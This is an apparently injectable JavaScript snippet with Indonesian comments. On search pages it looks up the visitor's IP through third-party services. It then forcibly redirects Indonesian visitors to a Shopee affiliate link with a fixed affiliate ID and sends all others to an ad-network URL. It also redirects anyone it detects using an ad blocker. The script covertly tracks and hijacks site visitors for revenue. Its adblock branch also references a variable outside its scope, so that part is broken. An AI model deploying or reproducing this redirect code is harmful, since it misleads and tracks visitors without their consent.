// Ambil URL saat ini
const currentUrl = window.location.href;

// Cari kata kunci pencarian di URL
const searchRegex = /\/search\/q=(.*)/;
const searchResult = currentUrl.match(searchRegex);

// Jika URL mengandung kata kunci pencarian
if (searchResult !== null) {
  // Ambil kata kunci pencarian
  const keyword = searchResult[1];

  // Lakukan HTTP request ke situs pihak ketiga untuk mendapatkan informasi IP
  const xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://api.ipify.org', true);
  xhr.onload = function() {
    if (xhr.status === 200) {
      // Jika berhasil mendapatkan informasi IP, cek apakah IP berasal dari Indonesia
      const ip = xhr.responseText;
      const xhr2 = new XMLHttpRequest();
      xhr2.open('GET', `https://ipwhois.app/json/${ip}`, true);
      xhr2.onload = function() {
        if (xhr2.status === 200) {
          const response = JSON.parse(xhr2.responseText);
          const countryCode = response.country_code;

          // Jika IP berasal dari Indonesia, redirect ke situs Shopee
          if (countryCode === 'ID') {
            const shopeeUrl = `https://shopee.co.id/search?filters=5%2C6%2C7&keyword=${keyword}`;
            const redirectUrl = `https://shope.ee/an_redir?origin_link=${encodeURIComponent(shopeeUrl)}&affiliate_id=11369620275&sub_id=RacunBelanja-14-03-20-23`;
            window.location.href = redirectUrl;
          } else {
            // Jika IP bukan berasal dari Indonesia, redirect ke situs lain
            const redirectUrl = 'https://www.highrevenuegate.com/ix4w14mn00?key=0647c1ed9e0e63fde67b1b37272c2227';
            window.location.href = redirectUrl;
          }
        }
      };
      xhr2.send();
    }
  };
  xhr.send();
}

// Anti adblock menggunakan teknik deteksi blocker yang dijelaskan di sini: https://blockadblock.com/blog/how-to-stop-ad-blocker-detection-on-your-website/
var adBlockDetected = false;
var testAd = document.createElement('div');
testAd.innerHTML = '&nbsp;';
testAd.className = 'adsbox';
document.body.appendChild(testAd);
window.setTimeout(function() {
  if (testAd.offsetHeight === 0) {
    adBlockDetected = true;
    window.location.replace(redirectUrl);
  } else {
    document.body.removeChild(testAd);
  }
}, 100);
